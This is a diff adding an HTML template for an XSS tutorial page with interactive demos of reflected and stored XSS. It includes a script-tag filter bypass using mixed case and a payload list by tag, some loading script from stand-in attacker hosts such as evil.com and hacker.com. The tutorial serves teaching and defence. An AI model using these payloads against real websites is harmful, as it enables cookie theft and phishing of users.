@@ -1,0 +1,110 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="container" style="margin-top: 5%">
+	<h2>Cross Site Scripting (XSS)</h2>
+	<h5>Prerequisites</h5>
+	<ul>
+		<li>HTML</li>
+		<li>CSS</li>
+		<li>Javascript</li>
+		<li>Basic knowledge about DOM</li>
+	</ul>
+	<h4>Introduction to XSS</h4>
+	<p><i><b>Note: </b>Do not use what you learn here to test (or worse, attack) websites without permission from the website's owner.</i></p>
+	<p>Cross-site scripting (XSS) is a security bug that can affect websites. If present in your website, this bug can allow an attacker to add their own malicious JavaScript code onto the HTML pages displayed to your users. Once executed by the victim's browser, this code could then perform actions such as completely changing the behavior or appearance of the website, stealing private data, or performing actions on behalf of the user.</p>
+	<h4>How it works</h4>
+	<p>In order to run malicious JavaScript code in a victim’s browser, an attacker must first find a way to inject a payload into a web page that the victim visits. Of course, an attacker could use social engineering techniques to convince a user to visit a vulnerable page with an injected JavaScript payload.</p>
+
+	<p>In order for an XSS attack to take place the vulnerable website needs to directly include user input in its pages. An attacker can then insert a string that will be used within the web page and treated as code by the victim’s browser.</p>
+	<p>Learning comes by doing, so there is our first intractive example.</p>
+	<hr>
+
+	<h5>Demo 1</h5>
+	<center><iframe width="75%" height="500px" src="/demo/1"></iframe></center>
+	<p>Demo application 1 consist of a search engine <b>Koogle</b>.</p>
+	<p>Search for <code>hello</code></p>
+	<p class="output">No results found for: <b>hello</b></p>
+	<p>Now search for <code>&lt;u&gt;hello&lt;/u&gt;</code></p>
+	<p class="output">No results found for: <b><u>hello</u></b></p>
+	<p>hello with underline in response shows that Koogle does not filter markup in response. An attacker can exploit this vulnerability by adding malicious Javascript code in search query like <code>&lt;script&gt;alert('you are hacked')&lt;/script&gt;</code></p>
+	<p>If you saw a alert box being popped up on clicking enter means Koogle is vulnerable to XSS. Wow! you just found an XSS bug. This is an example of <b>reflected</b> XSS attack, where JS attack vector <code>&lt;script&gt;alert('you are hacked')&lt;/script&gt;</code>is echoed back on the page return by server. To read more about XSS types, <a href="https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29#Stored_and_Reflected_XSS_Attacks" target="_blank" >click here</a>.</p>
+	<p>Other type of major XSS attacks are Stored XSS attacks. In this type of attacks injected attack vector is permanently stored on server, such as in databases, in a message forum, visitor log, comment field, etc.The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.</p>
+	<hr>
+
+	<h5>Demo 2</h5>
+	<center><iframe width="75%" height="500px" src="/demo/2"></iframe></center>
+	<p>Demo application 2 is of a chat forum named <b>Chatbook</b></p>
+	<p>Try to mess around it and try to find vulnerability in it.</p>
+	<p>You may observe that pervious attack vector <code>&lt;script&gt;alert('you are hacked')&lt;/script&gt;</code> is not working here. Instead it changes to <code>&lt;&gt;alert('you are hacked')&lt;/&gt;</code>. This implies that this app is using a filter on script tag i.e. it is changing every script tag to empty tag. To inject payload on application we need to bypass this filter. Try to find a way out!!</p>
+	<p>To bypass this filter we can simply use <code>&lt;ScriPt&gt;alert('you are hacked')&lt;/ScriPt&gt;</code>, changing case of some letters in script tag. The paayload is going to stored in server so every time you open the application you will see a pop up. This is an example of <b>Stored XSS</b></p>
+
+	<h4>What’s the worst an attacker can do with JavaScript?</h4>
+
+	<p>The consequences of what an attacker can do with the ability to execute JavaScript on a web page may not immediately stand out, especially since browsers run JavaScript in a very tightly controlled environment and that JavaScript has limited access to the user’s operating system and the user’s files.</p>
+
+	<p>However, when considering that JavaScript has access to the following, it’s easier to understand how creative attackers can get with JavaScript.</p>
+	<ul>
+    <li>Malicious JavaScript has access to all the same objects the rest of the web page has, including access to cookies. Cookies are often used to store session tokens, if an attacker can obtain a user’s session cookie, they can impersonate that user.</li>
+    <li>JavaScript can read and make arbitrary modifications to the browser’s DOM (within the page that JavaScript is running).</li>
+    <li>JavaScript can use AJAX to send HTTP requests with arbitrary content to arbitrary destinations.</li>
+    <li>Javascript can redirect users to other pages</li>
+    <li>JavaScript in modern browsers can leverage HTML5 APIs such as accessing a user’s geolocation, webcam, microphone and even the specific files from the user’s file system. While most of these APIs require user opt-in, XSS in conjunction with some clever social engineering can bring an attacker a long way.</li>
+  </ul>
+
+	<p>The above, in combination with social engineering, allow attackers to pull off advanced attacks including cookie theft, keylogging, phishing and identity theft. Critically, XSS vulnerabilities provide the perfect ground for attackers to escalate attacks to more serious ones.<br>
+	<a href="http://www.xss-payloads.com/payloads-list.html?a#category=all" target="_blank">Here</a>, is a list of some advance attacks.</p>
+
+	<h4>Some examples of Cross-site Scripting attack vectors</h4>
+		<p>The following is a non-exhaustive list of XSS attack vectors that an attacker could use to compromise the security of a website or web application through an XSS attack. A more extensive list of XSS payload examples is maintained <a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" onclick="_gaq.push(['_trackEvent', 'outbound-article', 'https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet', 'here']);" target="_blank">here</a>.</p>
+		<h6><code>&lt;script&gt;</code> tag</h6>
+		<p>The <code>&lt;script&gt;</code> tag is the most straight-forward XSS payload. A script tag can either reference external JavaScript code, or embed the code within the script tag.</p>
+		<pre><code>
+		&lt;!-- External script --&gt;
+		&lt;script src=http://evil.com/xss.js&gt;&lt;/script&gt;
+		&lt;!-- Embedded script --&gt;
+		&lt;script&gt; alert("XSS"); &lt;/script&gt;
+		</code></pre>
+		<h6><code>&lt;body&gt;</code> tag</h6>
+		<p>An XSS payload can be delivered inside <code>&lt;body&gt;</code> tag by using the <code>onload</code> attribute or other more obscure attributes such as the <code>background</code> attribute.</p>
+		<pre><code>&lt;!-- onload attribute --&gt;
+		&lt;body onload=alert("XSS")&gt;
+		&lt;!-- background attribute --&gt;
+		&lt;body background="javascript:alert("XSS")"&gt;</code></pre>
+		<h6><code>&lt;img&gt;</code> tag</h6>
+		<p>Some browsers will execute JavaScript when found in the &lt;img&gt;.</p>
+		<pre><code>&lt;!-- &lt;img&gt; tag XSS --&gt;
+		&lt;img src="javascript:alert("XSS");"&gt;
+		&lt;!-- <img> tag XSS using lesser-known attributes --&gt;
+		&lt;img dynsrc="javascript:alert('XSS')"&gt;
+		&lt;img lowsrc="javascript:alert('XSS')"&gt;</code></pre>
+		<h6><code>&lt;iframe&gt;</code> tag</h6>
+		<p>The <code>&lt;iframe&gt;</code> tag allows the embedding of another HTML page into the parent page. An IFrame can contain JavaScript, however, it&#8217;s important to note that the JavaScript in the iFrame does not have access to the DOM of the parent&#8217;s page do to the browser&#8217;s Content Security Policy (CSP). However, IFrames are still very effective means of pulling off phising attacks.</p>
+		<pre><code>&lt;!-- &lt;iframe&gt; tag XSS --&gt;
+		&lt;iframe src=”http://evil.com/xss.html”&gt;</code></pre>
+		<h6><code>&lt;input&gt;</code> tag</h6>
+		<p>In some browsers, if the <code>type</code> attribute of the <code>&lt;input&gt;</code> tag is set to <code>image</code>, it can be manipulated to embed a script.</p>
+		<pre><code>&lt;!-- &lt;input&gt; tag XSS --&gt;
+		&lt;input type="image" src="javascript:alert('XSS');"&gt;</code></pre>
+		<h6><code>&lt;link&gt;</code> tag</h6>
+		<p>The <code>&lt;link&gt;</code> tag, which is often used to link to external style sheets could contain a script.</p>
+		<pre><code>&lt;!-- &lt;link&gt; tag XSS --&gt;
+		&lt;link rel="stylesheet" href="javascript:alert('XSS');"&gt;</code></pre>
+		<h6><code>&lt;table&gt;</code> tag</h6>
+		<p>The <code>background</code> attribute of the <code>table</code> and <code>td</code> tags can be exploited to refer to a script instead of an image.</p>
+		<pre><code>&lt;!-- &lt;table&gt; tag XSS --&gt;
+		&lt;table background="javascript:alert('XSS')"&gt;
+		&lt;!-- &lt;td&gt; tag XSS --&gt;
+		&lt;td background="javascript:alert('XSS')"&gt;</code></pre>
+		<h6><code>&lt;div&gt;</code> tag</h6>
+		<p>The <code>&lt;div&gt;</code> tag, similar to the <code>&lt;table&gt;</code> and <code>&lt;td&gt;</code> tags can also specify a background and therefore embed a script.</p>
+		<pre><code>&lt;!-- &lt;div&gt; tag XSS --&gt;
+		&lt;div style="background-image: url(javascript:alert('XSS'))"&gt;
+		&lt;!-- &lt;div&gt; tag XSS --&gt;
+		&lt;div style="width: expression(alert('XSS'));"&gt;</code></pre>
+		<h6><code>&lt;object&gt;</code> tag</h6>
+		<p>The <code>&lt;object&gt;</code> tag can be used to include in a script from an external site.</p>
+		<pre><code>&lt;!-- &lt;object&gt; tag XSS --&gt;
+		&lt;object type="text/x-scriptlet" data="http://hacker.com/xss.html"&gt;</code></pre>
+		<hr>
+</div>
+{% endblock %}
